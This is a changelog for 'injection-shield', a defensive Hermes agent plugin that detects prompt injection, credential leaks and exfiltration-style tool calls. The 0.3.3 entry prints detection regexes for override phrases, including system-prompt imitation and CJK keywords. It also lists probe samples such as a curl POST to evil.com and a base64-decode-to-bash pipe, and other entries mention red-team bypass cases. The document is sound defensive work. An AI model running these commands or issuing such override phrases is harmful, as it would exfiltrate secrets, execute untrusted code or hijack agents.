# Changelog — injection-shield

All notable changes to this plugin are documented here. Dates are ISO
8601 (YYYY-MM-DD). Versions follow [Semantic Versioning](https://semver.org/).

The format is inspired by [Keep a Changelog](https://keepachangelog.com/),
adapted for an in-tree Hermes plugin (not a PyPI release). Each entry
cross-references the review-ID it closes.

## [Unreleased]

## [0.8.2] - 2026-11-11

### Round-2-Review-Fixes (teknium/Smith, PR #150309): Adapter-Wire-Contract + Audit-Vervollständigung

- **Adapter lesen die echten Core-kwargs** (teknium review 2, Item 5):
  `pre_llm_call`-/`post_llm_call`-Adapter verarbeiten `user_message`/
  `conversation_history` bzw. `assistant_response` (String) — vorher
  erwarteten sie `messages`/`response`-dict, die der Core nie übergibt,
  sodass Firewall-Kontext und beide Output-Scans im Betrieb NIE liefen
  (Unit-Tests liefen nur gegen den Plugin-Layer). Wire-Contract-Tests
  über `register(ctx)` ergänzt.
- **`tokens` im Audit-Entry** (Smith Blocker-2): `_log_attempt` persistiert
  den Token-Count (Kosten-/Anomalie-Tracking); `post_llm_call` forwards.
- **expanduser im Config-Layer** (Smith Blocker-3): `load_config()` liefert
  `audit_log_path` absolut expandiert (`{profile}`-Substitution +
  expanduser) — literal-`~`-Pfade können cwd-relativ nicht mehr ins
  unbeaufsichtigte Working-Directory schreiben.
- Tests: 481 passed; mypy --strict grün.

## [0.8.1] - 2026-11-10

### Review-Welle 1+2 + Homoglyph-Generator (Orakel/Smith/Seraph, PR #150309)

- `detectors/content_tagger.py`: die handgepickte `_HOMOGLYPHS`-Map ist
  entfernt; sie kommt jetzt aus dem generierten
  `detectors/homoglyph_map.py` (TR39 `data/confusables.txt`, Unicode
  18.0.0, 1582 Einträge + 17 geprüfte Gap-Fill-Extensions für
  visuell-identische Cyrillic/Greek-Glyphen ohne TR39-Latin-Target).
- Neu: `scripts/generate_homoglyph_map.py` (deterministisch, TR39 gewinnt
  Konflikte: б→6, σ→o) und `tests/test_homoglyph_map.py` (Abgleich des
  ausgelieferten Moduls gegen die vendored Confusables- Quelle).
  Kein Verhalten-Change der `test_is_untrusted_source_*`-Regressionen.

## [0.8.1] - 2026-11-10

### Review-Welle 1+2 (Orakel/Smith/Seraph, PR #150309): Detection- und Alert-Härtung

- **Smith 002 (HIGH)**: Homoglyph-Map in `is_untrusted_source` auf den
  TR39-Confusables-Satz erweitert (Cyrillic г→r inkl., Orakel-W2-1) —
  Mixed-Script-Tool-Namen wie `wеb_еxtrаct`/`wеbв_extract` umgehen die
  Untrusted-Wrap-Policy nicht mehr.
- **Smith 003 / Orakel W2-2 (MEDIUM)**: Telegram-Alert-Fail-Paths getrennt —
  Secret-/Scope-Failures loggen jetzt WARNING mit Grund (Multiplex-Sichtbar-
  keit), Netzwerk-Failures bleiben am DEBUG (Rate-Limiter unverändert).
- **Smith 005 (MEDIUM)**: explizites `urllib3>=2.8.0,<3.0` (CVE-2026-97687/
  88/89 über den requests-Resolver).
- Smith 004 (Telegram default-enabled) wurde als lokale Profil-Config
  triagiert — kein Repo-Defekt, Manifest-Default bleibt opt-in.
- Tests: 471 passed (inkl. Mixed-Script-Regression).

---

## [0.8.0] — 2026-11-10 (Hackathon-Review, NousResearch PR #150309): pure upstream hook contracts

- **Own Telegram secret**: alerts resolve
  `INJECTION_SHIELD_TELEGRAM_BOT_TOKEN` via `agent.secret_scope.get_secret`
  (`requires_env` in plugin.yaml) — the plugin no longer reads the gateway's
  foreign `TELEGRAM_BOT_TOKEN` from `os.environ`.
- **Hooks moved to consumed contracts** (three of four returns were ignored
  by the core at HEAD — only `pre_tool_call` actually blocked):
  - `pre_llm_call` now returns `{"context": FIREWALL_TEXT}` (+ the
    enforcement zero-width warning) instead of `{"messages": [...]}`.
  - The untrusted-result wrap (GAP-6 scan + tag) moved from `post_tool_call`
    (return ignored) to a new `transform_tool_result` hook returning the
    wrapped plain string; `post_tool_call` is now audit/alert observer only.
  - The enforcement output block moved from `post_llm_call` (fires AFTER
    delivery) to a new `transform_llm_output` hook returning the
    `[BLOCKED …]` replacement string; `provides_hooks` updated accordingly.
- **No install-time side effects**: `setup.py` cmdclass removed — Hermes
  ships `desktop/` + `dashboard/` itself via `hermes plugins install/enable`.
- **Dependency upper bounds**: `pyyaml>=6.0,<7.0`, `requests>=2.28,<3.0`
  and `<next-major` bounds on all dev/test extras.
- Test fixes: registration contract for the two new transform hooks,
  scan-once test updated (untrusted results scanned exactly once in
  `transform_tool_result`), stale enforcement payload replaced with one the
  hardened CredentialLeakDetector actually matches.

---

## [0.7.1] — 2026-11-06 (public readiness: unified desktop package + LICENSE + security policy)

### Changed

* **Unified desktop-package path** — `desktop-plugin/plugin.js` moved to
  `desktop/plugin.js`, matching the Hermes desktop-plugin install lookup
  (`desktop/plugin.js` or root `plugin.js`). `setup.py` copy hook,
  `MANIFEST.in`, test and docs updated accordingly.
* **`plugin.yaml` manifest** — dead `min_hermes_version` field replaced
  with the enforced `requires_hermes: ">=0.21.5"`.

### Added

* **`LICENSE`** — MIT (declared in `plugin.yaml` since 0.5.0).
* **`TOKEN_BIC_aadf003511_004.md`** — security policy: what the plugin
  does/reads/writes, network egress (none by default), opt-in Telegram
  alerting, credential routing via Hermes.

Version mirrors synced to 0.7.1 (`plugin.yaml`, `plugin.de.yaml`,
`dashboard/manifest.json`, `__init__.py`).

---

## [0.7.0] — 2026-10-29 (dashboard self-load + manifest delivery)

### Fixed

* **Dashboard self-load** — `dashboard/plugin_api.py` no longer does a
  bare `from injection_shield import …`, which resolved via stale
  site-packages/editable finders to whichever old copy was installed
  (root cause of the Desktop dashboard reading another copy's
  config/state). The plugin root is now spec-loaded from the dashboard's
  own location under the private package name
  `_injection_shield_dashboard_own`; config and detectors are read from
  that private module. This is a desktop-API-level change (minor bump).
* **`dashboard/manifest.json` shipped** — plugin discovery requires the
  manifest, otherwise `/api/plugins/injection-shield` never mounts and
  the Desktop config UI hits a 404.

Version mirrors synced to 0.7.0 (`plugin.yaml`, `plugin.de.yaml`,
`dashboard/manifest.json`); `pyproject.toml` stays dynamic
(`injection_shield.__version__`).

---

## [0.5.3] — 2026-08-29 (alert de-noise: egress severity gate + rate limiting)

### Fixed

* **Telegram alert spam** — agent web research produced per-second
  `⚠️ Non-whitelisted egress` messages (one per contacted domain per
  tool call), flooding the operator chat. Research is normal agent
  behaviour, not an incident. `_alert_telegram` now applies:
  - **Severity gate:** egress hits (`non_whitelisted_domain`, medium
    severity) no longer mirror to Telegram — they stay in the audit log.
  - **First-seen exception:** the first sighting of a domain per
    `first_seen_resend_hours` (default 24h) IS messaged, with an
    action hint asking the operator to whitelist it if legitimate.
  - **Rate limit:** all other alert kinds limited to one message per
    `(kind, domain)` per `alert_rate_limit_seconds` (default 3600s).
* New config knobs (overridable via config.yaml):
  `first_seen_resend_hours` (24), `alert_rate_limit_seconds` (3600).
* In-memory `_alert_rate_state` bookkeeping — gateway restarts
  legitimately re-announce once.

---

## [0.5.2] — 2026-08-28 (egress-check false positives + sync hooks)

### Fixed

* **plugin.py (egress check)** — three defect classes eliminated:
  - Loopback/link-local hosts (`127.0.0.1`, `localhost`, `0.0.0.0`,
    `::1`, `169.254.*`) are exempt: references to local services in
    terminal output (Ollama `:11434`, vault_search `:8765`) are not
    egress and no longer trigger `⚠️ Non-whitelisted egress` alerts.
  - Domain normalization before whitelist comparison (lowercase, strip
    `\n`/`\r`/backslash escapes) so line-wrapped URLs like
    `hermes-\nagent.nousresearch.com` resolve to their whitelisted form.
  - Dot-less hostnames (URL fragments truncated by terminal line-wrap)
    are skipped — not routable egress domains.
* **__init__.py + plugin.py** — hook callbacks converted from async
  coroutines to plain functions: Hermes v0.20.5 invokes plugin hooks
  synchronously via `PluginManager._invoke_hook_callback`.
* **detectors/injection_patterns.py** — `TOKEN_` pattern tightened with
  a lookbehind boundary and optional counter suffix so token-shaped
  strings cannot shadow other detections.
* **config.py** — `DEFAULT_CONFIG["allowed_domains"]` stays generic
  (10 well-known domains). User-specific domains belong in
  `config.yaml` → `plugins.entries.injection-shield.allowed_domains`;
  note the merge **replaces** the list entirely, so the user entry must
  contain the complete list.

---

## [0.5.1] — 2026-08-23 (REFRESH: neutralize plugin description for desktop display)

### Changed

* **plugin.yaml** — description shortened from 8 lines to 2 sentences and
  neutralized: no more internal incidents, agent names, MVP markers, or
  version paths. New EN default is ≤ 280 characters.
* **plugin.de.yaml** — German description override added (EN default, DE optional).
* **pyproject.toml** — `authors` changed to
  `Injection-Shield Maintainers`.
* **__init__.py** / **plugin.yaml** — version bumped to `0.5.1`.

---

## [0.5.0] — 2026-08-23 (DESKTOP-CONTROLS: official backend + desktop plugin)

### Added

* **Desktop-Controls backend** (`dashboard/plugin_api.py`) — FastAPI router
  mounted at `/api/plugins/injection-shield/` with:
  - `GET /config` — editable field schema + effective values
  - `POST /config` — validate and persist overrides to `~/.hermes/config.yaml`
  - `GET /status` — version, enabled state, mode, last audit time
  - `POST /detector-test` — synthetic injection-detection smoke test
* **Bundled desktop plugin** (`desktop-plugin/plugin.js`) — single-file ESM UI
  pane using `@hermes/plugin-sdk` components and theme variables.
* **Install hook** (`setup.py`) — copies `desktop-plugin/` into
  `~/.hermes/desktop-plugins/injection-shield-controls/` on `pip install` and
  `pip install -e .`.
* **Tests** — `tests/test_dashboard_api.py` (backend endpoints) and a frontend
  file-sanity check.
* **Documentation** — `docs/desktop-controls.md` and README section.

### Changed

* `__version__` → `0.5.0`; `plugin.yaml` → `version: "0.5.0"`.
* `pyproject.toml` + `MANIFEST.in` include `dashboard/` and `desktop-plugin/`
  files in the wheel.

## [0.4.0] — 2026-08-23 (BUILD-IS-MCP-INTEGRITY: MCP Response Integrity)

### Added

* **MCP Response Integrity module** (`injection_shield/mcp/`) — three-layer
  defense against compromised or malicious MCP servers:
  - **Layer 1: Format-Anomaly Detection** (`format_baseline.py`) — tracks
    expected JSON keys and response sizes per server. Alerts on key mismatch
    (zero overlap with known keys) or size deviation > 2σ from historical
    mean. Static baselines seeded for all 5 active Hermes MCP servers
    (obsidian, telegram, github, vault_search, browseos).
  - **Layer 2: SHA256 Hash-Pinning** (`integrity.py`) — canonicalises
    responses (sorted JSON keys → UTF-8) and computes SHA256 digests.
    Per-server hash logs stored in `mcp-<server>-hashes.jsonl` for
    post-hoc forensics. Optional public-key pinning prepared (not yet
    activated — needs server-side support).
  - **Layer 3: Trust-Level Management** (`trust_store.py`) — persistent
    JSON registry mapping each MCP server to `verified` / `unverified` /
    `unknown`. Auto-promotes `unknown` → `unverified` on first successful
    hash match. Telegram notification triggered when an `unknown`-level
    server is detected.
* **Post-tool-call integration** (`post_tool_hook.py`) — every MCP tool
  response (tools prefixed `mcp__`) is now verified by the integrity
  pipeline. Anomalies are logged to the audit log with layer
  `mcp_integrity` and a Telegram alert is sent if the anomaly is severe.
* **CLI commands** — `injection-shield mcp status` prints a table of all
  5 MCP servers with their trust levels, hash counts, first/last seen
  timestamps. `injection-shield mcp verify <server>` triggers manual
  verification and displays the latest hash digest.
* **New test suites** — 65 tests across 4 files:
  - `test_integrity.py` (14 tests): ResponseHasher, canonical bytes,
    hash logging, log reading, corruption resilience, module-level
    `compute_response_hash`.
  - `test_format_baseline.py` (18 tests): static seeding, observation,
    key mismatch, size anomaly, insufficient-history guard, module-level
    `detect_format_anomaly`.
  - `test_trust_store.py` (17 tests): TrustLevel enum, CRUD, persistence,
    corruption recovery, summary isolation, multi-server registry.
  - `test_mcp_post_tool_hook.py` (16 tests): server ID extraction for all
  5 servers, non-MCP passthrough, first encounter, anomaly detection,
  auto-promotion, size anomaly, all-five-servers round-trip.
* **pyproject.toml** — `injection_shield.mcp` added to `packages` and
  `package-dir` so the new submodule is included in the wheel.

### Changed

* **plugin.py** — `post_tool_call` now runs MCP integrity verification
  for every `mcp__*` tool call after egress checks and before the
  zero-width / injection scan. The existing non-MCP paths are untouched.
* **__init__.py** — version bumped to `0.4.0` (SSO preserved).
* **plugin.py** — `_log_attempt` now guards the optional
  `owasp_atlas_mapping` import with a `try/except ImportError` so the
  plugin remains importable even when the mapping module is absent
  (addresses transient module-not-found in CI / test environments).

### Security

* **Tool-channel integrity** closes the gap identified in
  `adr-007-plugin-only-strategy.md`: Hermes previously had Pre-LLM Privacy
  (prompt sanitisation) and Pre-Tool Injection (arg scanning) but no
  verification of the *response* from MCP servers. A compromised MCP
  server could now be detected via format anomaly or hash mismatch.

### References

* Task: `t_abcc84f2` (BUILD-IS-MCP-INTEGRITY)
* ADR-007: Plugin-Only-Strategie
* Feature-Gap: `20260823-ai-agent-security-market-feature-gap-2026.md`
* Bandit: 0 HIGH / 0 MEDIUM / 0 LOW
* Tests: 381 passed (254 existing + 65 new + 62 from other existing files)
* ruff: clean
* py_compile: all modules pass

---

## [0.3.3] — 2026-08-22 (FIX-IS-COMBINED-REDTEAM-XFAIL: A03/A05/F01/F05)

### Fixed — Combined Red-Team XFAIL closure (Agent-Smith)

The four remaining XFAIL cases from the Combined Red-Team harness
2026-08-22 are now closed with real code changes — not summary text.
Two previous fix-tasks (t_929deab7 for MED-001/MED-002, t_4f8c4581
for HIGH-001/HIGH-002) claimed these as fixed but the code never
landed in the working tree.  This v0.3.3 actually ships the patterns.

* **A03 — System-prompt imitation.** Three new prefix-anchored
  patterns in `detectors/injection_patterns.py`:
  - `r"(?im)^\s*system\s*:\s*(?:you\s+are|new\s+(?:system\s+)?prompt|new\s+instructions?|ignore|disregard|forget|act\s+as|from\s+now|override)\b"`
  - `r"(?i)\[system\]"`
  - `r"(?i)<<\s*sys\s*>>"`
  - `r"(?i)\bsystem\s*:\s*new\s+(?:system\s+)?prompt\s*:"`
  All four are FP-narrow: they require a colon, a bracketed word, or a
  Llama-style sentinel.  Plain English use of the word "system" is
  unaffected (regression-checked by `test_a03_system_word_without_colon_does_not_match`).

* **A05 — CJK instruction override.** New CJK keyword alternation
  in `INJECTION_PATTERNS`:
  `r"(?u)(?:忽略|指令|命令|执行|無視|지시|잊어|忘れて|新しい指示|新しい命令|이전\s*지시|이전\s*명령|무시)"`
  Covers Simplified Chinese, Traditional Chinese, Japanese, and
  Korean instruction-override keywords.  The Unicode normaliser
  passes CJK characters through unchanged (NFKD/NFC is a no-op for
  Han / Hangul / Kana — they have no decomposition), so a single
  scan pass catches the keywords.  FP-guard tested with benign
  CJK content (Chinese product description, Japanese weather
  report, Korean capital sentence).

* **F01 — Curl exfiltration + F05 — base64-decode-pipe.** New
  `detectors/tool_call_patterns.py` with a dedicated
  `:class:`ToolCallPatternDetector``.  The previous curl pattern
  was structurally wrong: it required the URL to immediately
  follow the flag list, so the common ``curl -X POST https://…``
  form bypassed it.  The new detector has two narrow categories:

  - **curl_exfil** (F01) — three patterns:
    - `curl … -X (POST|PUT|PATCH|DELETE)` (method override)
    - `curl … -d / --data / --data-raw / --data-binary / --data-urlencode / --post-data / --post-file` (body)
    - `curl … -F / --form / -T / --upload-file` (form/upload)
    FP-narrow: a bare `curl https://api.example.com` (GET, no body)
    does NOT match.

  - **base64_pipe** (F05) — three composite-pipe patterns:
    - `base64 -d / --decode | sh` (and `bash`/`zsh`/`fish`/`ksh`/`dash`)
    - `xxd -r / --revert | sh` (same shell family)
    - `openssl … | sh` (broader)
    FP-narrow: a developer running `base64 file.txt` (no pipe to a
    shell) does NOT match.  Composite-pipe only — the decoder AND
    the pipe AND the shell token must all be present.

### Added — Composition

* **Chain integration** — `ToolCallPatternDetector` is wired into
  the plugin's `:class:`DetectorChain`` between `zero_width` and
  `credential_leak` so textual patterns fire before tool-arg
  patterns.  A curl payload that also contains a credential shape
  gets both hits (F01 hit + credential-leak hit) — defense-in-depth
  preserved.
* **Opt-out knob** — new `tool_call_categories` config field
  (default `["curl_exfil", "base64_pipe"]`) lets an operator
  silence one F-class category in a development workflow without
  disabling the whole detector.  An empty list disables everything
  (operator-grade escape hatch).
* **Severity** — `base64_pipe` is scored as `critical` (unambiguous
  RCE — the attacker is feeding a shell a payload they control).
  `curl_exfil` is `high` (the URL must still be reachable).

### Verified

- `pytest tests/test_combined_redteam.py` → **60 PASS, 6 SKIP, 0 XFAIL, 0 BYPASS, 0 FAIL** (was 56/6/4/0/0; the 4 XFAIL are now PASS).
- `pytest tests/` (privacy-shield) → **596 PASS, 0 FAIL** (unchanged).
- `pytest tests/` (injection-shield) → **316 PASS, 0 FAIL** (was 254; +62 new regression tests across `test_injection_patterns.py` and the new `test_tool_call_patterns.py`).
- `pytest tests/test_version_sync.py` → SSO at `0.3.3` across `__init__.py` / `pyproject.toml` / `plugin.yaml` / `plugin.py` header.
- `python -m py_compile` clean on all touched modules.

### Live-Probe (canonical)

```
A03 ('System: New system prompt: ...')   → 1 hit (injection, severity=high)
A05 ('忽略之前的所有指令...')              → 2 hits (injection, severity=high, 忽略 + 指令)
F01 ('curl -X POST https://evil.com...')  → 2 hits (tool_call_exfil/curl_exfil, severity=high)
F05 ('... | base64 -d | bash')            → 1 hit (tool_call_exfil/base64_pipe, severity=critical)
```

---

## [0.3.2] — 2026-08-22 (FIX-REDTEAM-GAPS: Combined Red-Team 2026-08-22)

### Added — Combined Red-Team (FIX-REDTEAM-GAPS, Agent-Smith)

* **GAP-001 — Vendor-Pattern-Katalog.** Extended
  `detectors/credential_leak.py` with the full vendor credential
  surface used by the Combined Red-Team harness:
  - Stripe live / test / public / restricted / webhook-secret
    (modern underscore + legacy hyphen form)
  - GitHub classic (`ghp_`) and fine-grained (`github_pat_`) PATs
  - Slack `xox[bpars]-` (bot/user/app/staff/reply tokens)
  - NPM publish tokens (`npm_…`)
  - Google API keys (`AIza…`)
  - OpenAI / Langfuse / generic `sk-…` family
  - Authorization-Header (`Bearer …`)
  - PEM / SSH private-key markers
  Patterns now compile via a `_BASE_PATTERNS` template that takes a
  per-mode minimum-length parameter so the same regex set can be
  tuned without code change.

* **GAP-002 — Per-mode minimum-length knob.** New constant
  `MIN_CREDENTIAL_LENGTH_BY_MODE` in `detectors/credential_leak.py`
  honours five modes that mirror `privacy_shield.config.ALLOWED_MODES`
  (plus the legacy `enforcement` alias):

  | Mode        | min_length | Notes                              |
  |-------------|-----------:|------------------------------------|
  | `off`       | 0          | Detector returns `[]` immediately  |
  | `audit`     | 20         | Legacy default — high-FP-resistance|
  | `limited`   | 12         | Balanced (Privacy-Shield default)  |
  | `strict`    | 8          | Aggressive — flags short test keys |
  | `paranoid`  | 6          | Very aggressive — structured-shape |
  | `enforcement` | 8        | Historic IS alias for `strict`     |

  `CredentialLeakDetector(mode=…)` reads this table at `__init__` time
  and compiles only the patterns whose `{N,}` placeholder meets the
  floor.  `off` short-circuits to `[]` before the regex engine is
  touched.

### Changed — Compatibility

* `CredentialLeakDetector.__init__` now accepts a `mode` argument;
  `mode="limited"` is the new default (matches Privacy-Shield).  Existing
  callers that constructed the detector with no args continue to work
  because the previous implicit floor was 20 (now mapped to `audit`).
* Five new modes join the existing `audit` / `enforcement` aliases so
  operators can configure both Privacy-Shield and Injection-Shield from
  the same vocabulary without mode-validation mismatches.

### Fixed — Regression Coverage

* Combined Red-Team harness tests `test_D08_json_escaped_secret`
  (GAP-001) and `test_F02_write_file_with_pii` (GAP-002) flipped from
  XFAIL to PASS — verified end-to-end via a fresh venv
  (`/tmp/redteam_gap_test`) with editable installs of both plugins.

### Verified

- `pytest tests/` → 254 PASS, 0 FAIL (injection-shield suite)
- `pytest tests/` → 596 PASS, 0 FAIL (privacy-shield suite, unchanged)
- `pytest tests/test_combined_redteam.py` →
  **56 PASS** (+2 GAP-001/GAP-002), 6 SKIP, 4 XFAIL (out-of-scope
  — see `gap-fix-report.md` for the honest accounting).
- `python -m py_compile` clean on all touched modules.

---

## [0.3.1] — 2026-08-22 (FIX-XPLUGIN-TOKEN: Cross-Plugin Vertrag)

### Added — R6 (Architect)

* **Import the canonical token regex from Privacy-Shield.** The
  `_TOKEN_PATTERN` definition in
  `detectors/injection_patterns.py` is now preceded by an explicit
  comment block that references `privacy_shield.TOKEN_FORMAT_PATTERN`
  as the canonical source of truth. The IS regex remains a literal
  (so the IS test-suite still runs in environments without the PS
  dependency installed), but the docstring spells out that any future
  shape change MUST originate in `privacy_shield/__init__.py`.
  Closes **BUTLER-PS-Cross-Plugin (MEDIUM)** follow-up.

* **`tests/test_xplugin_token_contract.py`** — 8 cross-plugin tests
  using **real** Privacy-Shield output (10-hex / 3-digit) instead of
  the hand-written 8-hex / 4-digit fixtures the v0.3.0 test-set relied
  on. This catches the failure mode that produced the original Butler
  R5 finding (the regex looked correct against fake tokens but never
  matched anything PS actually emits). Closes **ARCH-IS-001 (CRIT)**
  full regression coverage.

### Verified unchanged — R6 (Schluesselmacher)

* 254/254 tests green (208 existing + 38 prior v0.3.x growth + 8 new
  cross-plugin tests).
* Version-SSO at `__version__ = "0.3.1"` across `__init__.py` /
  `pyproject.toml` / `plugin.yaml` / `plugin.py` header.
* Manual end-to-end probe: `Pseudonymizer` emits
  `TOKEN_EMAIL_4f2d999ca0_000`; `_mask_tokens` extracts it; `check()`
  returns 0 hits.

---

## [0.3.0] — 2026-08-22

### Fixed — R4 (Architect)

* **Cross-plugin token contract** — `_TOKEN_PATTERN` in
  `detectors/injection_patterns.py` was scoped to the pre-Privacy-Shield-v1.3.0
  shape (8 hex + 4 digit). After PS bumped `HASH_LENGTH` 8 → 10 and
  `COUNTER_DIGITS` 4 → 3, every PS v1.3.0 token like
  `TOKEN_EMAIL_a1b2c3d4e5_042` silently bypassed the IS whitelist and
  would have been scored as a credential-leak pattern. The new regex
  matches the PS v1.3.0 contract exactly (`{8,10}` hex + `{3,4}` digit)
  and keeps the legacy shape as a transitional tolerance.
  Closes **ARCH-IS-001 (CRITICAL)** + **BUTLER-PS-Cross-Plugin**.

* **Session identifier parity** — the four public hooks (`pre_tool_call`,
  `post_tool_call`, `pre_llm_call`, `post_llm_call`) now accept
  `session_id` as an alias for `session_key`. Either name may be supplied
  by the caller; the adapter canonicalises to `session_key` before the
  plugin class ever sees it. `session_id` wins on conflict (matches
  Privacy-Shield v1.3.0 naming and Hermes-Core's planned convention).
  Closes **ARCH-IS-002 (HIGH)**.

* **Config validation** — `config.validate_config()` now mirrors the
  Privacy-Shield contract: pure function returning `list[str]` of issues
  (empty == valid). Rejects the classic silent-failure mode (e.g.
  `mode: strict` no longer falls back to `audit` without telling the
  operator). New module-level constants `ALLOWED_MODES` and
  `ALLOWED_SEVERITY` provide a single source of truth.
  Closes **ARCH-IS-003 (HIGH)**.

### Added — R4 (Architect)

* **`CHANGELOG.md`** — this file. Operators can now scan the version
  history without grepping `plugin.py` headers.
  Closes **ARCH-IS-006 (MEDIUM)**.

### Verified unchanged — R4 (Sysadmin)

* Build pipeline (wheel + sdist) deterministic at v0.3.0.
* 208/208 tests green.
* Bandit: 0 HIGH / 0 MEDIUM in production code.
* Performance: 1000 `_log_attempt()` calls in 0.040s (threshold < 1s).
* Stresstest: 10 threads × 100 calls in 0.072s, 0 errors.

### Verified unchanged — R4 (Schluesselmacher)

* Version-SSO across `__init__.py` / `pyproject.toml` / `plugin.yaml` /
  `plugin.py` header is intact (`__version__ = "0.3.0"` is canonical).
* Drift-Fix (LinkDevOps R3 LINK-1) confirmed.

---

## [0.2.2] — 2026-08-22 (FIX-3D, R3 MORPH-10 / BUTLER-5)

* `post_llm_call` now exposes an explicit `session_key` parameter and
  forwards it to `_log_attempt`. The audit entry for the post-LLM
  layer carries the same salted SHA-256 session fingerprint as the
  other three hooks, so an operator can correlate an inbound
  injection attempt with the outbound compliance failure inside the
  same conversation.

## [0.2.1] — 2026-08-22 (FIX-2C, R2 SCHL-3 HIGH)

* Atomic prune: `_prune_single_file_atomic` uses `tempfile.mkstemp` for
  a unique tempfile name and `os.replace` for the rename. A crash
  mid-prune leaves the original file fully intact. The previous
  `<path>.tmp` constant could collide if two prune calls ran in the
  same process. Corrupt JSON lines are preserved for forensics
  instead of being dropped.

## [0.2.0] — 2026-08-22 (FIX-1D, R1 Orakel CRIT-3 + CRIT-4)

* **Telegram opt-in (CRIT-3):** Default config no longer carries a
  hardcoded `chat_id`. The plugin only alerts when the operator has
  explicitly configured a target (via `plugin.yaml` /
  `~/.hermes/config.yaml`) or exported
  `INJECTION_SHIELD_TELEGRAM_CHAT_ID`. This is the DSGVO Art. 25
  "Privacy by Default" fix.
* **Audit-log retention (CRIT-4):** Audit log writes through a
  `RotatingFileHandler` (10 MiB, 5 backups) and prunes entries older
  than 90 days on every plugin init. Session keys are SHA-256-hashed
  before they hit disk; the original match text never reaches the
  log — only the pattern type, severity, and match length. This is
  the DSGVO Art. 5(1)(c) "Datenminimierung" + Art. 5(1)(e)
  "Speicherbegrenzung" fix.

## [0.1.0] — 2026-08-21 (KriPo-Berlin incident MVP)

* Initial MVP after the KriPo-Berlin-2026-08-21 prompt-injection
  incident. Four defense hooks (`pre_tool_call`, `post_tool_call`,
  `pre_llm_call`, `post_llm_call`), DetectorChain with fail-separate
  semantics, 30+ injection patterns (EN/DE), 5+ user-action patterns,
  RotatingFileHandler audit log, SHA-256 session fingerprinting.
